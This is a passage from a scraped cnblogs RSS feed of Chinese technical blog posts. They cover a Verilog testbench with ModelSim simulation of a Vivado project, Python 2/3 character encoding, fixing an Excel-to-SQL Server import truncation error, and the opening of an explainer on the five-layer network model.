&lt;span&gt;182&lt;/span&gt;                 &lt;span&gt;if&lt;/span&gt;(k%&lt;span&gt;4&lt;/span&gt; == &lt;span&gt;3&lt;/span&gt;)&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;183&lt;/span&gt;                     &lt;span&gt;if&lt;/span&gt;(dout_buf[k] != num)&lt;span&gt;begin&lt;/span&gt; 
&lt;span&gt;184&lt;/span&gt;                         $fdisplay(fid,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Data of the packet is wrong!\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;185&lt;/span&gt;                         err_flag = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;186&lt;/span&gt;                     &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;187&lt;/span&gt;                     num = num+&lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;188&lt;/span&gt;                 &lt;span&gt;end&lt;/span&gt;    
&lt;span&gt;189&lt;/span&gt;                 &lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;(dout_buf[k] != &lt;span&gt;0&lt;/span&gt;)&lt;span&gt;begin&lt;/span&gt;
&lt;span&gt;190&lt;/span&gt;                     $fdisplay(fid,&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Data of the packet is wrong,it should be zero!\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;191&lt;/span&gt;                     err_flag = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;192&lt;/span&gt;                 &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;193&lt;/span&gt;             &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;194&lt;/span&gt;             chk_time = chk_time + &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;195&lt;/span&gt;         &lt;span&gt;end&lt;/span&gt;
&lt;span&gt;196&lt;/span&gt; &lt;span&gt;    endtask
&lt;/span&gt;&lt;span&gt;197&lt;/span&gt;     
&lt;span&gt;198&lt;/span&gt; &lt;span&gt;endmodule&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;tx_buffer_tb&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;　　&lt;span&gt;可见主要是task编写及文件读写操作帮了大忙，如果都用眼睛看波形来验证设计正确性，真的是要搞到眼瞎。为保证测试完备性，测试包生成task可通过输入接口产生不同长度和无效字节数的递增数据包。testbench中每检测到输出包尾指示信号eop即调用packet_check task对数值进行检测。本文的testbench结构较具通用性，可以用来验证任意对数据包进行处理的逻辑单元。&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　之前Modelsim独立仿真带有IP核的Vivado工程时经常报错，只好使用Vivado自带的仿真工具。一直很头痛这个问题，这次终于有了进展！首先按照常规流程使用Vivado调用Modelsim进行行为仿真，启动后会在工程目录下产生些有用的文件，帮助我们脱离Vivado进行独立仿真。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1201289/201810/1201289-20181007212918446-1179279749.png&quot; alt=&quot;&quot; width=&quot;584&quot; height=&quot;301&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;在新建Modelsim工程时，在红框内选择Vivado工程中&amp;lt;project&amp;gt;.sim -&amp;gt; sim_1 -&amp;gt; behav下的modelsim.ini文件。之后添加文件包括：待测试设计文件、testbench以及IP核可综合文件。第三个文件在&amp;lt;project&amp;gt;.srcs -&amp;gt; sources_1 -&amp;gt; ip -&amp;gt; &amp;lt;ip_name&amp;gt; -&amp;gt; synth下。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1201289/201810/1201289-20181007213041326-1780038279.png&quot; alt=&quot;&quot; width=&quot;307&quot; height=&quot;264&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;现在&lt;/span&gt;&lt;span&gt;可以顺利启动仿真了。我们来看下仿真结果：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1201289/201810/1201289-20181007213720542-652207165.png&quot; alt=&quot;&quot; width=&quot;1062&quot; height=&quot;223&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1201289/201810/1201289-20181007213733822-13305931.png&quot; alt=&quot;&quot; width=&quot;1061&quot; height=&quot;205&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1201289/201810/1201289-20181007213751556-967533212.png&quot; alt=&quot;&quot; width=&quot;1058&quot; height=&quot;207&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;文件中信息打印情况：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1201289/201810/1201289-20181007213922548-530332355.png&quot; alt=&quot;&quot; width=&quot;494&quot; height=&quot;179&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　从波形和打印信息的结果来看，基本可以证明数据缓存及位宽转换模块逻辑功能无误。为充分验证要进一步给出覆盖率较高的测试数据集，后期通过编写do文件批量仿真实现。在FPGA或IC设计中，验证占据大半开发周期，可见VerilogHDL的非综合子集也是至关重要的，今后会多总结高效的验证方法！&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 07 Oct 2018 13:44:00 +0000</pubDate>
<dc:creator>没落骑士</dc:creator>
<og:description>本文设计思想采用明德扬至简设计法。上一篇博文中定制了自定义MAC IP的结构，在用户侧需要位宽转换及数据缓存。本文以TX方向为例，设计并验证发送缓存模块。这里定义该模块可缓存4个最大长度数据包，用户根</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/moluoqishi/p/9751652.html</dc:identifier>
</item>
<item>
<title>第7天字符编码 - 沉沦的罚</title>
<link>http://www.cnblogs.com/huwentao/p/9750547.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/huwentao/p/9750547.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;strong&gt;什么是字符编码？&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　计算机只能识别0和1，当我们&lt;span&gt;与计算机进行交互的时候不可能通过0和1进行交互&lt;/span&gt;，因此我们需要一张表把我们人类的语言一一对应成计算机能够识别的语言，这张表就是我们通常所说的字符编码表。因为计算机是美国人发明的，在设计之初的时候并未考虑到全世界的情况，所以最开始只有一张ASCII表（这个表只是英文和计算机识别语言的一一对应），随着计算机的普及，为了使用计算机，各国陆陆续续的又出现了很多自己国家的字符编码表，但是这样就造成了另外&lt;span&gt;一种现象，就是乱码。&lt;/span&gt;当中国使用外国的软件的时候，由于编码表不一样的问题导致无法解码出正确的字符，从而出现乱码。为了解决这样的问题，出现了一个叫做unicode的万国码，把世界上所有的语言通过这一张表一一映射，这样乱码的问题就解决了。但是unicode由于所占字节过大，&lt;span&gt;为了节省空间从而达到减少IO操作时间的目的，又出现了一种变长编码方式utf-8（unicode transform format）&lt;/span&gt;,它只是unicode的一种转换格式，和世界上其他的语言没有一一对应关系，目前现状来看，计算机内存中使用的编码方式是unicode。所以在我们进行编码和解码的过程中，如果出现了各国语言不一致的问题，我们需要通过unicode进行转换。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;目前有的字符编码&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1181163/201810/1181163-20181007165946178-52900389.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;软件执行文件的三步骤，python解释器也一样&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1181163/201810/1181163-20181007170400314-100747973.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;文件存入硬盘的过程（&lt;a href=&quot;http://www.cnblogs.com/linhaifeng/articles/5950339.html#_label4&quot;&gt;nodpad++&lt;/a&gt;为例）&lt;/p&gt;
&lt;p&gt;结论：存文件的过程中不能出错，一旦存错就算是相同的编码方式也是解码不了的。&lt;/p&gt;
&lt;p&gt;第一步：打开软件，也就是操作系统把软件添加到内存中&lt;/p&gt;
&lt;p&gt;第二步：输入内容，此时所有的内容都是存在内存中的（先更改字符编码集，然后在写入内容），当我们编码改成日文的时候会发现目前我们依然能够看到是不乱码的，那是因为在内存中都是以unicode的形式编码的，无论是哪一国的语言都是可以显示的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1181163/201810/1181163-20181007171806980-170941428.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;第三步：点击保存按钮，把内容保存在硬盘上面&lt;/p&gt;
&lt;p&gt;第四步：以同样的编码方式重新打开的时候发现中文出现乱码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1181163/201810/1181163-20181007172745168-156414249.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;python读取文件的三个步骤&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;第一步：打开python解释器，加载到内存，没有实际文件的编码和解码过程&lt;/p&gt;
&lt;p&gt;第二步：python当作一个文本编辑器去从硬盘中加载文件到内存，此时不会关注语法，但是有解码的过程。因此当初存文件的时候的编码和解码是否一样决定是否会报错。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;python2默认编码方式为ASCII
python3默认编码方式为utf&lt;/span&gt;-&lt;span&gt;8&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;左边是一个以gbk的方式存储的文件，右边通过python3和python2分别去执行文件都会报错，这个是在第二步读取文件就会出现的错误，因为python2和python3默认编码方式都不是gbk，因此在加载到内存这一步就出现了错误&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1181163/201810/1181163-20181007174515199-358663348.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在前面加上了一行字符，表示告诉解释器当在读取文件的时候应该用哪中编码方式，这样在加载到内存这一步就不会出错了。报错的原因并不是字符编码的问题，而是程序的语法问题，也就是第三步了。&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1181163/201810/1181163-20181007175019400-1259189542.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当前两步执行完成之后，文件中的内容就以unicode的方式存在了内存中。&lt;/p&gt;
&lt;p&gt;接下来开始执行第三部，也就是python语法的检测（在这一步的处理python2和python3是不一样的）：&lt;/p&gt;
&lt;p&gt;　　为什么python2和python3在这一步不一样呢？代码存在与内存中是要存两份的，第一份就是在第二步（在未执行代码之前）从文件中读取出来的代码是以unicode的方式存在于内存中的，第二份就是在代码的执行过程中会对字符串重新申请一份内存空间，而这份内存空间是以什么样的编码方式存储的是与python的解释器有关系的！&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;print函数&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;print函数打印的时候默认是以终端的编码格式打印的！&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;python3&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;当python3读到   s = '你瞅啥'   会重新申请一份内存空间然后把   ‘你瞅啥’   以unicode的方式存储起来。（所以说无论终端是以什么样的编码格式打印的都是不会出现乱码的）&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 下面这段代码无论放在哪里都是可以执行出来结果的，因为内存中的都是unicode编码&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;_*_coding:gbk_*_&lt;/span&gt;
s = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;你愁啥&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;(s, type(s))
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;_*_coding:gbk_*_&lt;/span&gt;
s = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;你愁啥&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;(s, type(s))
&lt;/pre&gt;
&lt;pre&gt;
#s可以直接encode成任意编码格式
print(s.encode('gbk')) 
print(type(s.encode('gbk'))) #&amp;lt;class 'bytes'&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;python2&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;当python2读到   s = '你瞅啥'   默认会重新申请一份内存空间然后把   ‘你瞅啥’   以最上面一行的编码方式存储&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 如果是python2运行此代码，当运行到s = '你瞅啥' 的时候会新开辟一个内存空间以gbk的格式存进去&lt;br/&gt;# 所以打印终端必须是gbk，否则会出现错误&lt;br/&gt;&lt;/span&gt;&lt;span&gt;
#&lt;/span&gt;&lt;span&gt;_*_coding:gbk_*_&lt;/span&gt;
s = &lt;span&gt;'&lt;/span&gt;&lt;span&gt;你愁啥&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;(s, type(s))
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 如果是python2的话一般会在字符串前面加上u，直接把字符串解码成unicode格式&lt;/span&gt;

&lt;span&gt;#&lt;/span&gt;&lt;span&gt;_*_coding:gbk_*_&lt;/span&gt;
s = u&lt;span&gt;'&lt;/span&gt;&lt;span&gt;你愁啥&lt;/span&gt;&lt;span&gt;'  # 相当于执行了 s = '你瞅啥'.decode('gbk')&lt;/span&gt;
&lt;span&gt;print&lt;/span&gt;(s, type(s))
&lt;/pre&gt;&lt;/div&gt;

</description>
<pubDate>Sun, 07 Oct 2018 13:38:00 +0000</pubDate>
<dc:creator>沉沦的罚</dc:creator>
<og:description>什么是字符编码？ 计算机只能识别0和1，当我们与计算机进行交互的时候不可能通过0和1进行交互，因此我们需要一张表把我们人类的语言一一对应成计算机能够识别的语言，这张表就是我们通常所说的字符编码表。因为</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/huwentao/p/9750547.html</dc:identifier>
</item>
<item>
<title>解决将Excel表导入到SQL Server数据库时出现Text was truncated or one or more characters had no match in the target code错误 - wangmengdx</title>
<link>http://www.cnblogs.com/wangmengdx/p/9751558.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wangmengdx/p/9751558.html</guid>
<description>&lt;p&gt;&lt;span&gt;编写python爬虫程序可以在电商、旅游等网站上爬取相关评论数据，这些数据可以用于词云制作、感情词分析、提取关键词等，也可以将爬取下来的数据以自己的方式进行展示。评论数据爬取下来后，就要考虑怎样入库，可以在爬虫程序中编写代码直接入库，也可以将爬取到的数据存到Excel表格中，再将Excel表格导入到数据库中。在将Excel表格导入到SQL Server数据库时可能会出现很多错误，这里要解决的错误是：Text was &lt;span&gt;truncated&lt;/span&gt; or one or more characters had no match in the target code。这是由于字段大小（size）设置过小，而数据中有超过这个size的记录从而导致了截断（truncate）。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在SSMS中，可以编写SQL语句或使用菜单创建数据表，并为表中的字段设置大小（size）。在将Excel表格导入到数据库时，字段的大小又是怎么确定的呢？在Excel表格中，第一行的各列值作为数据表（指数据库中的table）中的各字段名，第二行以后的每一行的记录将作为数据表中的记录。下面两张图反映了Excel表中数据和数据表中数据的对应关系。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img title=&quot;景点概览示例&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007200545060-943523012.jpg&quot; alt=&quot;景点概览示例&quot; width=&quot;800&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img title=&quot;景点概览示例2&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007200821897-257704892.jpg&quot; alt=&quot;景点概览示例2&quot; width=&quot;800&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;我们在SSMS中打开“景点概览”数据表的设计视图，查看各字段的大小（size）。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img title=&quot;数据表中各字段的大小&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007201113013-614494066.jpg&quot; alt=&quot;数据表中各字段的大小&quot; width=&quot;800&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Excel表在导入到数据库后，字段的Data Type（数据类型）是根据Excel表中第二行（即第一条记录）的值推出的。如果第二行对应列的那个值是数字，数据库中相应字段的Data Type就是float型，如果值是字符，相应字段的Data Type就是nvarchar(255)。将数字都作为float型，将字符都作为nvarchar(255)型可以避免一些截断问题或高精度向低精度转换等问题的出现。但如果某一个字段的Data Type被设置成了nvarchar(255)，而表中又有记录的值的大小超过了255，那么就会出现文章开头所说的truncate（截断）问题。所以，&lt;span&gt;将Excel表格的各条记录中，最长的那条记录放到Excel表格的第二行（即第一条记录的位置），就可以解决上面所说的问题&lt;/span&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;一、准备Excel表格数据&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　Excel表格是可以导入到SQL Server的，但是WPS表格是不行的。准备好Excel表格后，另存为成合适的格式（Excel 2003或当前的Excel版本号，后面会用到）。这里保存成Excel 2003（.xls）的格式。使用的数据是夫子庙景区的评论数据，首行只有一个字段“评论”。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img title=&quot;将Excel表格另存为合适的格式&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007202234859-2049168004.jpg&quot; alt=&quot;将Excel表格另存为合适的格式&quot; width=&quot;800&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img title=&quot;夫子庙景区评论&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007202339030-339335441.jpg&quot; alt=&quot;夫子庙景区评论&quot; width=&quot;800&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;二、在SSMS中创建数据库并导入Excel表格&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　打开SSMS，创建数据库，右键数据库-Tasks-Import Data，打开SQL Server Import and Export Wizard。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img title=&quot;右键数据库导入Excel&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007202546428-1794225382.jpg&quot; alt=&quot;右键数据库导入Excel&quot; width=&quot;800&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img title=&quot;SQL Server Import and Export Wizard&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007202705325-1028786355.jpg&quot; alt=&quot;SQL Server Import and Export Wizard&quot; width=&quot;500&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　选择Data source数据源为Microsoft Excel表格，选择准备好的Excel文件，在Excel version中选择相应的版本号。已自动勾选的First row has column names表示Excel表格中首行作为字段值。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img title=&quot;选择要导入的Excel表格&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007202824602-1705720162.jpg&quot; alt=&quot;选择要导入的Excel表格&quot; width=&quot;500&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　选择导入Destination为：SQL Server Native Client，Server name是当前SQL Server连接的服务名，应该是自动出现的，Authentication选择登录方式（Windows身份验证或SQL Server身份验证），Database选择Excel表导入到的数据库。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img title=&quot;选择要导入到的数据库&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007203036753-1174288029.jpg&quot; alt=&quot;选择要导入到的数据库&quot; width=&quot;500&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　选择全部导入或者编写SQL语句部分导入（我也不是很明白..）。这里选择：Copy data from one or more tables or views，全部导入。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img title=&quot;全部导入或query选择导入&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007203346793-1185508703.jpg&quot; alt=&quot;全部导入或query选择导入&quot; width=&quot;500&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　Next之后，选择Excel表中的工作簿（这里只有一个夫子庙）。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img title=&quot;选择夫子庙表&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007203544636-372178807.jpg&quot; alt=&quot;选择夫子庙表&quot; width=&quot;500&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　点击Edit Mappings，可以看到“评论”字段的Data Type被设置成了nvarchar(255)。这里要注意，虽然在这里Size这个值是可以更改的，但是即使改为max后依然导入失败（没有解决）。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img title=&quot;查看夫子庙评论字段的size&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007205126027-1549433481.jpg&quot; alt=&quot;查看夫子庙评论字段的size&quot; width=&quot;500&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　继续后续步骤，执行导入。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img title=&quot;后续步骤1&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007205457094-407588631.jpg&quot; alt=&quot;后续步骤1&quot; width=&quot;500&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img title=&quot;后续步骤2&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007205530710-583537421.jpg&quot; alt=&quot;后续步骤2&quot; width=&quot;500&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　点击完成，导入失败，查看出错日志。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img title=&quot;报错&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007205658152-335379313.jpg&quot; alt=&quot;报错&quot; width=&quot;800&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;三、整理Excel表格数据重新导入&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　上面的Excel表格导入失败了，在整理表格之前，要在SSMS中将失败的数据表删掉（虽然失败了，但是数据表的框架已经创建了）。如果对表格进行SELECT查询，结果是空的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img title=&quot;查询到了空结果&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007205925776-582755686.jpg&quot; alt=&quot;查询到了空结果&quot; width=&quot;800&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　打开Excel表格，找到最长的那条记录，并将其移动到第二行。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img title=&quot;找到最长的那条记录&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007210135621-1187631763.jpg&quot; alt=&quot;找到最长的那条记录&quot; width=&quot;800&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img title=&quot;将最长的那条记录移到第二行&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007210242226-2075299857.jpg&quot; alt=&quot;将最长的那条记录移到第二行&quot; width=&quot;800&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　重新导入到数据库，这次导入成功了。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img title=&quot;查看夫子庙评论字段的size2&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007210412176-276190335.jpg&quot; alt=&quot;查看夫子庙评论字段的size2&quot; width=&quot;500&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img title=&quot;导入成功&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007210505390-166852162.jpg&quot; alt=&quot;导入成功&quot; width=&quot;500&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　在SSMS中，SELECT查询刚才导入进来的数据。Excel表格导入进来的数据表的名字是Excel表中数据簿的名字后+&quot;$&quot;符号。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img title=&quot;查询刚才导入进来的数据&quot; src=&quot;https://img2018.cnblogs.com/blog/1432088/201810/1432088-20181007210625093-1772335546.jpg&quot; alt=&quot;查询刚才导入进来的数据&quot; width=&quot;800&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;四、总结&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　在将Excel表格导入到SQL Server数据库时如果出现：&lt;span&gt;Text was truncated or one or more characters had no match in the target code&lt;/span&gt; 这个错误，&lt;span&gt;将Excel表中最长的那条记录移到第二行即可（即第一条记录所在行）解决导入失败的问题&lt;/span&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　另外，SQL Server数据库的导入导出功能还可以实现数据库中数据导出到Excel表或其他一些数据源之间的相互导入导出，读者可以进行尝试。&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Sun, 07 Oct 2018 13:30:00 +0000</pubDate>
<dc:creator>wangmengdx</dc:creator>
<og:description>解决在将Excel表格导入到SQL Server数据库时出现：Text was truncated or one or more characters had no match in the targ</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/wangmengdx/p/9751558.html</dc:identifier>
</item>
<item>
<title>通俗讲解计算机网络五层协议 - 浴血卫国</title>
<link>http://www.cnblogs.com/pla1949/p/9743578.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/pla1949/p/9743578.html</guid>
<description>&lt;p&gt;=========================================================================================&lt;/p&gt;
&lt;p&gt;    &lt;strong&gt;在我看来，学习java最重要是要理解what(这东西是什么)，why(为什么要用它)，where(在哪用它)，how(怎么用)。所以接下来，我都是以这样的思想来和大家交流，从最基础的知识讲起。如果有啥出错的，欢迎大家前来批评。本人虚心接纳。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;=========================================================================================&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;      &lt;/strong&gt;我们需要了解一下JavaWeb是怎样运行的？一个Web项目运行的原理是基于计算机网络的知识，总的大概过程如下。&lt;/p&gt;
&lt;p&gt;      首先在在浏览器中输入要访问的网址，回车后浏览器向web服务器发送一个HTTP请求；根据计算机网络知识，两台电脑的访问中间需要经过五层协议，包括物理层，数据链路层，网络层，运输层，应用层。下面通俗说一下五个层次，以发送方和接收方为例子。&lt;/p&gt;
